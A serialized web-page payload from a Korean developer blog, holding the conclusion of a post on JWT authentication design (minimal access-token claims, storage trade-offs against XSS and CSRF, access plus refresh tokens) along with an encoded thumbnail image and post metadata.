+JWT 기반 인증은 서버가 로그인 상태를 직접 저장하지 않고, 클라이언트가 토큰을 통해 자신을 증명하는 방식이다. 이 구조는 확장성과 유연성 측면에서 강력한 장점을 가진다. 하지만 JWT는 단순히 '토큰을 발급해서 쓰면 되는 방식'이 아니다. Access Token에는 최소한의 정보만 담아야 하고, 민감한 정보는 절대 포함해서는 안 된다. 또한 Access Token을 어디에 저장할지에 따라 XSS와 CSRF 같은 보안 이슈도 함께 고려해야 한다.
+
+실무에서는 Access Token만 사용하는 단순한 방식보다, Access Token과 Refresh Token을 함께 사용하는 구조가 더 일반적이다. Access Token은 짧게 유지하고, Refresh Token은 서버에서 관리 가능한 형태로 설계하면 보안성과 사용자 경험을 어느 정도 함께 가져갈 수 있다. 결국 JWT 기반 인증의 핵심은 '토큰을 사용한다'가 아니라, '토큰을 어떻게 설계하고 관리할 것인가'에 있는 것 같다. 서비스의 구조, 보안 요구사항, 사용자 경험을 함께 고려해서 적절한 전략을 선택하는 것이 중요한 것 같다.
+5:T1cc7,data:image/webp;base64,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0:{"rsc":["$","$1","c",{"children":[["$","$2",null,{"fallback":null,"children":["$","$L3",null,{"tag":{"id":"jwt","name":"JWT","count":1},"posts":[{"id":"141e3749-631b-4ee3-b469-3e256f3de56a","assetBasePath":"/content/posts/2026-03-17 14:57:43/","title":"JWT(Json Web Token) 기반 인증","summary":"세션 기반 인증은 서버가 사용자의 로그인 상태를 직접 저장하고 관리하는 방식이다. 사용자가 로그인하면 서버는 세션 저장소에 사용자 정보를 저장하고, 클라이언트는 그 세션을 식별할 수 있는 sessi","content":"$4","thumbnail":"$5","thumbnailUrl":"/content/posts/2026-03-17 14:57:43/thumbnail.webp","isoDateTime":"2026-03-17T05:57:43.000Z","localeDateTime":"2026년 3월 17일","year":"2026","month":"03","day":"17","date":"2026.03.17","timestamp":1773727063000,"series":{"id":"인증과-인가","name":"인증과 인가","count":1},"tags":[{"id":"개발","name":"개발","count":0},{"id":"jwt","name":"JWT","count":0}],"toc":[{"id":"들어가며","title":"들어가며","depth":2,"children":[]},{"id":"1-개요","title":"1. 개요","depth":2,"children":[{"id":"11-jwt란-무엇인가","title":"1.1. JWT란 무엇인가","depth":3,"children":[]},{"id":"12-세션-기반-인증과-jwt-기반-인증의-차이","title":"1.2. 세션 기반 인증과 JWT 기반 인증의 차이","depth":3,"children":[]}]},{"id":"2-jwt-기반-인증의-동작-방식","title":"2. JWT 기반 인증의 동작 방식","depth":2,"children":[]},{"id":"3-access-token","title":"3. Access Token","depth":2,"children":[{"id":"31-access-token의-역할","title":"3.1. Access Token의 역할","depth":3,"children":[]},{"id":"32-access-token에-포함되어야-하는-정보","title":"3.2. Access Token에 포함되어야 하는 정보","depth":3,"children":[]},{"id":"33-access-token에-포함하면-안-되는-정보","title":"3.3. Access Token에 포함하면 안 되는 정보","depth":3,"children":[]}]},{"id":"4-access-token-저장-위치","title":"4. Access Token 저장 위치","depth":2,"children":[{"id":"41-localstorage에-저장하는-방식","title":"4.1. localStorage에 저장하는 방식","depth":3,"children":[]},{"id":"42-메모리에-저장하는-방식","title":"4.2. 메모리에 저장하는 방식","depth":3,"children":[]},{"id":"43-httponly-cookie에-저장하는-방식","title":"4.3. HttpOnly Cookie에 저장하는 방식","depth":3,"children":[]}]},{"id":"5-jwt-기반-인증-방식의-종류","title":"5. JWT 기반 인증 방식의 종류","depth":2,"children":[{"id":"51-access-token만-사용하는-방식","title":"5.1. Access Token만 사용하는 방식","depth":3,"children":[]},{"id":"52-access-token-refresh-token-방식","title":"5.2. Access Token + Refresh Token 방식","depth":3,"children":[]}]},{"id":"6-refresh-token-설계","title":"6. Refresh Token 설계","depth":2,"children":[{"id":"61-jwt-기반-refresh-token","title":"6.1. JWT 기반 Refresh Token","depth":3,"children":[]},{"id":"62-랜덤-문자열-기반-refresh-token","title":"6.2. 랜덤 문자열 기반 Refresh Token","depth":3,"children":[]},{"id":"63-refresh-token-rotation","title":"6.3. Refresh Token Rotation","depth":3,"children":[]}]},{"id":"7-jwt-기반-인증의-특징","title":"7. JWT 기반 인증의 특징","depth":2,"children":[]},{"id":"8-사용-기준","title":"8. 사용 기준","depth":2,"children":[]},{"id":"마치며","title":"마치며","depth":2,"children":[]}]}]}]}],["$L6"],"$L7"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"_YsNo4mI2eX2ZzTG0sI8s"}
+6:["$","script","script-0",{"src":"/_next/static/chunks/0bwq3.6~do~0k.js","async":true}]
+7:["$","$L8",null,{"children":["$","$2",null,{"name":"Next.MetadataOutlet","children":"$@9"}]}]
+9:null
